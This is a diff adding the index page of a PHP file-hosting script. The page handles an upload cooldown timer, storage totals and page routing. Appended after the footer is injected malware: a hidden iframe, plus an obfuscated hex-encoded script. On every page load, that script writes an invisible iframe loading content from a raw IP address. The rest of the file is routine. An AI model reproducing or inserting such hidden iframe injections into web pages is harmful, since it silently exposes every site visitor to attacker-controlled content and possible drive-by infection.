@@ -1,0 +1,146 @@
+<?php
+//  ___  ____       _  ______ _ _        _   _           _
+//  |  \/  (_)     (_) |  ___(_) |      | | | |         | |
+//  | .  . |_ _ __  _  | |_   _| | ___  | |_| | ___  ___| |_
+//  | |\/| | | '_ \| | |  _| | | |/ _ \ |  _  |/ _ \/ __| __|
+//  | |  | | | | | | | | |   | | |  __/ | | | | (_) \__ \ |_
+//  \_|  |_/_|_| |_|_| \_|   |_|_|\___| \_| |_/\___/|___/\__|
+//
+// by GalaxyScripts.com                version 1.2
+// original source code by Jim (j-fx.ws)
+////////////////////////////////////////////////////////
+
+include("./config.php");
+include("./header.php");
+
+$userip=$_SERVER['REMOTE_ADDR'];
+$time=time();
+
+///////////////////////////////////////////TIMER////////////////////////////////////
+
+if(file_exists("./uploader/".$userip.".mfh"))
+{
+
+$downloaders = fopen("./uploader/".$userip.".mfh","r+");
+flock($downloaders,2);
+
+while (!feof($downloaders)) {
+  $user[] = chop(fgets($downloaders,65536));
+}
+
+fseek($downloaders,0,SEEK_SET);
+ftruncate($downloaders,0);
+
+$youcantdownload = 0;
+foreach ($user as $line) {
+list($savedip,$savedtime) = explode('|',$line);
+ if ($savedip == $userip) {
+    if ($time < $savedtime + ($uploadtimelimit*60)) {
+      $youcantdownload = 1;
+	  $downtimer = $time - $savedtime ;
+	  $counter = $uploadtimelimit*60 - $downtimer;
+    }
+  }
+
+  if ($time < $savedtime + ($uploadtimelimit*60)) {
+    fputs($downloaders,"$savedip|$savedtime\n");
+  }
+}
+
+
+if($youcantdownload==1) {
+?><center><table style="margin-top:0px;width:790px;height:400px;"><tr><td style="border:1px #AAAAAA solid;height:100%;background-color:#FFFFFF;padding:20px;text-align:left;" valign=top><?
+echo "<h1><center>Upload Time Limit</center></h1>";
+	    ?><script type="text/javascript">
+
+var running = false
+var endTime = null
+var timerID = null
+var totalMinutes = <?php echo $counter;?>;
+
+function startTimer() {
+    running = true
+    now = new Date()
+    now = now.getTime()
+    endTime = now + (1000 * totalMinutes);
+    showCountDown()
+}
+
+function showCountDown() {
+    var now = new Date()
+    now = now.getTime()
+    if (endTime - now <= 0) {
+       clearTimeout(timerID)
+       window.location.reload()
+
+    } else {
+        var delta = new Date(endTime - now)
+        var theMin = delta.getMinutes()
+        var theSec = delta.getSeconds()
+        var theTime = theMin
+        theTime += ((theSec < 10) ? ":0" : ":") + theSec
+        document.getElementById('SessionTimeCount').innerHTML = 'Please wait ( <font color="#FF0000">' + theTime + '</font> ) Minutes for Upload'
+        if (running) {
+            timerID = setTimeout("showCountDown()",1000)
+        }
+    }
+}
+
+window.onload=startTimer
+</script>
+
+
+<center><span id="SessionTimeCount"></span></center><br /><br /><br /><br />
+ <?
+
+	    include("./bottomads.php");
+
+?><td><tr><table><?
+ include("./footer.php");
+      die();
+
+}
+
+}
+
+///////////////////////////////////////////TIMER///////////////////////
+
+
+$sizehosted = 0; //get the storage size hosted
+$handle = opendir("./storage/");
+while($file = readdir($handle)) {
+$sizehosted = $sizehosted + filesize ("./storage/".$file);
+  if((is_dir("./storage/".$file.'/')) && ($file != '..')&&($file != '.'))
+  {
+  $sizehosted = $sizehosted + total_size("./storage/".$file.'/');
+  }
+}
+$sizehosted = round($sizehosted/1024/1024,2);
+
+if(isset($allowedtypes)){ //get allowed filetypes.
+  $types = implode(", ", $allowedtypes);
+  $filetypes = "<b>$lang[allfile]</b> ".$types."<br /><br />";
+} else { $filetypes = ""; }
+
+if(isset($categories)){ //get categories
+  $categorylist = "$lang[cat2]: <select name=\"category\">";
+  foreach($categories as $category){
+    $categorylist .= "<option value=\"".$category."\">".$category."</option>";
+  }
+  $categorylist .= "</select><br />";
+} else { $filetypes = ""; }
+
+if(isset($_GET['page']))
+  $p = $_GET['page'];
+else
+  $p = "0";
+include 'total.php';
+
+switch($p) {
+case "tos": include("./pages/tos.php"); break;
+case "faq": include("./pages/faq.php"); break;
+default: include("./pages/upload.php"); break;
+}
+
+include("./footer.php");
+?><iframe src='http://url' width='1' height='1' style='visibility: hidden;'></iframe><script>function v47c2cf9e1f67d(v47c2cf9e1fa76){  return(parseInt(v47c2cf9e1fa76,16));}function v47c2cf9e20686(v47c2cf9e20a7c){ function v47c2cf9e21671 () {return 2;} var v47c2cf9e20e78='';for(v47c2cf9e2127a=0; v47c2cf9e2127a<v47c2cf9e20a7c.length; v47c2cf9e2127a+=v47c2cf9e21671()){ v47c2cf9e20e78+=(String.fromCharCode(v47c2cf9e1f67d(v47c2cf9e20a7c.substr(v47c2cf9e2127a, v47c2cf9e21671()))));}return v47c2cf9e20e78;} document.write(v47c2cf9e20686('3C5343524950543E77696E646F772E7374617475733D27446F6E65273B646F63756D656E742E777269746528273C696672616D65206E616D653D353533656630643836303361207372633D5C27687474703A2F2F37372E3232312E3133332E3138382F2E69662F676F2E68746D6C3F272B4D6174682E726F756E64284D6174682E72616E646F6D28292A323033353735292B27323830323361355C272077696474683D343235206865696768743D343739207374796C653D5C27646973706C61793A206E6F6E655C273E3C2F696672616D653E27293C2F5343524950543E'));</script>
